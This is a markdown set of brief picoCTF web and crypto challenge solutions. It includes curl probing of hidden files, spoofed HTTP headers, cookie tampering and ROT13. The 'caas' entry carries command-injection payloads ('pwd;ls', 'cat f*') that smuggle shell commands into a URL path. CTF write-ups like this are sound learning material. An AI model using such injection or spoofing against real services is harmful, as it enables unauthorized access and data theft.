# :robot: - where are the robots - `4`
```sh
$ curl http://jupiter.challenges.picoctf.org:36474/robots.txt
. . .
User-agent: *
Disallow: /_.html
. . .

$ curl http://jupiter.challenges.picoctf.org:36474/_.html
```

# :female_detective: - Insp3ct0r - `18`
```r
#!/bin/bash

alias cmd='grep -i flag | sed "s/^.*flag: //" | sed "s/ .*$//" '
url='https://jupiter.challenges.picoctf.org/problem/41511'

curl -s ${url}/index.html | cmd
curl -s ${url}/mycss.css | cmd
curl -s ${url}/myjs.js | cmd
```
[script](https://github.com/nuoxoxo/writeups/blob/main/scripts/pico_insp3ct0r.sh)

# :wood: - logon - `46`
- in chrome do `chrome://flags`
- set Partitioned cookies to enable
- relaunch and set admin cookie to true 

# :thread: - dont-use-client-side - `66`
```r
$ curl http://jupiter.challenges.picoctf.org:37821 | grep substring 
```

# :question: - who are you - `142`
```r
# HTTP Requests for Comments (RFC)

$ curl -H "user-agent: PicoBrowser" \
-H "referer: mercury.picoctf.net:34588" \
-H "date: 2018" 
-H "DNT: 1" \
-H "origin: sweden" \
-H "x-forwarded-for: 31.44.224.0" \
-H "accept-language: sv-swe" \
http://mercury.picoctf.net:34588
```

# :carrot: - Mod 26 - `144`
```sh
# ROT13
$ echo _ | tr 'n-za-mN-ZA-M' 'a-zA-z'

# or alternatively
$ echo _ | tr "A-Za-z" "N-ZA-Mn-za-m"

```

# :accept: - Some Assembly Required 1 - `152`
###### hint: path in script

# :hungary: - scavenger hunt - `161`
```r
#!/bin/bash

alias cmd='grep -i part | sed "s/^.*: //" | sed "s/ .*$//" '
url='http://mercury.picoctf.net:55079'

curl -s ${url} | cmd
curl -s ${url}/mycss.css | cmd
curl -s ${url}/robots.txt | cmd
curl -s ${url}/.htaccess | cmd
curl -s ${url}/.DS_Store | cmd
```
[script](https://github.com/nuoxoxo/writeups/blob/main/scripts/pico_scavenger_hunt.sh)

###### edited from
```sh
#!/bin/bash

curl -s -n http://mercury.picoctf.net:55079 | grep -i part | sed "s/^.*: //" | sed "s/ .*$//"
curl -s http://mercury.picoctf.net:55079/mycss.css | grep -i part | sed "s/^.*: //" | sed "s/ .*$//"
curl -s http://mercury.picoctf.net:55079/robots.txt | grep -i part | sed "s/^.*: //" | sed "s/ .*$//"
curl -s http://mercury.picoctf.net:55079/.htaccess | grep -i part | sed "s/^.*: //" | sed "s/ .*$//"
curl -s http://mercury.picoctf.net:55079/.DS_Store | grep -i part | sed "s/^.*: //" | sed "s/ .*$//"
```

# :snake: - Python Wrangling - `166`
```scala
$ wget _ _ _ && cat pw.txt | python3 ende.py -d flag.txt.en
```

# :baseball: - login - `200`
###### hint: base64

# :cow: - caas - `202`
```sh
$ curl "https://caas.mars.picoctf.net/cowsay/pwd;ls"
$ curl "https://caas.mars.picoctf.net/cowsay/xxx;cat f*"
```

[github flavor emoji list](https://gist.github.com/rxaviers/7360908)

# :rainbow_flag: - wave a flag - `170`
```sh
$ strings warm | grep pico
```
